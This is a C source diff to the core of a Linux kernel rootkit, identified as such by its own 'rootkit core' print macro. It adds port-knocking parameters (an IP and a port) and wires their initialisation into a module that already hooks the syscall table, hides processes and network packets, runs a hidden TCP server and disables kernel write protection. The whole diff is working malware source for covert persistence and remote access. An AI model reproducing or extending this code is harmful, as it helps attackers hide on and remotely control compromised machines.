@@ -34,6 +34,7 @@
 #include "packet_masking.h"			/* Needed for ... */
 #include "conf_manager.h"			/* Needed for ... */
 #include "tcp_server.h"				/* Needed for ... */
+#include "port_knocking.h"			/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
@@ -52,6 +53,7 @@ MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
 
 /* Definition of macros */
 #define DEBUG_MODE_IS_ON 1
+#define LOCALHOST "127.0.0.1"
 #define PIDS_BUFFSIZE 8
 #define PRINT(str) printk(KERN_INFO "rootkit core: %s\n", (str))
 #define DEBUG_PRINT(str) if (DEBUG_MODE_IS_ON) PRINT(str)
@@ -72,6 +74,8 @@ typedef asmlinkage ssize_t (*my_recvmsg_syscall)(int, struct user_msghdr __user 
 /* Definition of global variables */
 static int pids[PIDS_BUFFSIZE];
 static int pids_count;
+static char *pk_ip = LOCALHOST;
+static int pk_port;
 static void **syscall_table;
 asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
 asmlinkage int (*original_getdents_syscall)(unsigned int, struct linux_dirent *, unsigned int);
@@ -96,6 +100,10 @@ asmlinkage ssize_t generic_recvmsg_syscall(int, struct user_msghdr __user *, uns
 
 module_param_array(pids, int, &pids_count, 0);
 MODULE_PARM_DESC(pids, "PIDS to be masked");
+module_param(pk_ip, charp, 0000);
+MODULE_PARM_DESC(pk_ip, "");
+module_param(pk_port, int, 0);
+MODULE_PARM_DESC(pk_port, "");
 
 /* Callback list heads */
 LIST_HEAD(read_callbacks);
@@ -133,6 +141,7 @@ static int __init core_start(void)
 	packet_masking_init(DEBUG_MODE_IS_ON);
 	conf_manager_init(DEBUG_MODE_IS_ON, pids[0]);
 	tcp_server_init(DEBUG_MODE_IS_ON);
+	port_knocking_init(DEBUG_MODE_IS_ON, pk_ip, pk_port);
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -154,6 +163,7 @@ static void __exit core_end(void)
 
 	enable_write_protect_mode();
 
+	port_knocking_exit();
 	tcp_server_exit();
 	conf_manager_exit();
 	packet_masking_exit();
